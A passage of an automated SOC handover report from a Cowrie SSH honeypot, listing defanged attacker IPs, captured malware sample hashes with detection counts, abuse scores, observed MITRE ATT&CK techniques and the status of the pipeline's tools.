| `20.29.21[.]208` | **2** | 2026-05-27 18:11 | 2026-05-27 18:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]185` | **2** | 2026-05-27 18:58 | 2026-05-27 18:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `89.223.0[.]202` | **2** | 2026-05-27 18:53 | 2026-05-27 18:56 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.126.54[.]167` | 1 | 2026-05-27 18:11 | 2026-05-27 18:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.36.109[.]176` | 1 | 2026-05-27 18:47 | 2026-05-27 18:47 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.96.200[.]105` | 1 | 2026-05-27 18:33 | 2026-05-27 18:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.175.88[.]6` | 1 | 2026-05-27 19:46 | 2026-05-27 19:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `113.44.104[.]43` | 1 | 2026-05-27 19:10 | 2026-05-27 19:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.217.21[.]253` | 1 | 2026-05-27 17:25 | 2026-05-27 17:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.254.1[.]141` | 1 | 2026-05-27 20:10 | 2026-05-27 20:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]31` | 1 | 2026-05-27 18:46 | 2026-05-27 18:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.170[.]111` | 1 | 2026-05-27 17:36 | 2026-05-27 17:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `189.147.19[.]238` | 1 | 2026-05-27 18:46 | 2026-05-27 18:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.96.139[.]211` | 1 | 2026-05-27 20:00 | 2026-05-27 20:00 | 1s | 0 | `T1592` | 🟢 LOW |
| `23.227.147[.]163` | 1 | 2026-05-27 18:04 | 2026-05-27 18:04 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `23.95.132[.]61` | 1 | 2026-05-27 17:24 | 2026-05-27 17:24 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `68.72.84[.]114` | 1 | 2026-05-27 20:20 | 2026-05-27 20:21 | 13s | 0 | `T1592` | 🟢 LOW |
| `84.33.121[.]224` | 1 | 2026-05-27 17:26 | 2026-05-27 17:26 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `89.223.0[.]202` | KZ | NLS Networks IPoE | **100** ⚠️ | 1 |
| `101.126.82[.]218` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `189.147.19[.]238` | MX | Gestión de direccionamiento UniNet | **100** ⚠️ | 18 |
| `20.29.21[.]208` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `114.217.21[.]253` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 4 |
| `113.44.104[.]43` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **100** ⚠️ | 4 |
| `66.132.172[.]185` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `101.96.200[.]105` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 21 |
| `195.96.139[.]211` | GB | Driftnet Ltd | **100** ⚠️ | 5 |
| `27.128.171[.]39` | CN | CHINANET hebei province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 77 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 29 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 24 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 15 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 15 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 7 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 97 cases |
| Tool 34  | Credential Extractor        | ✅ 53 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 30 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (9.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 29 priority case(s) shown individually · 22 recon entry/entries in table (7 group(s) consolidating 44 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-27T20:23:51Z_
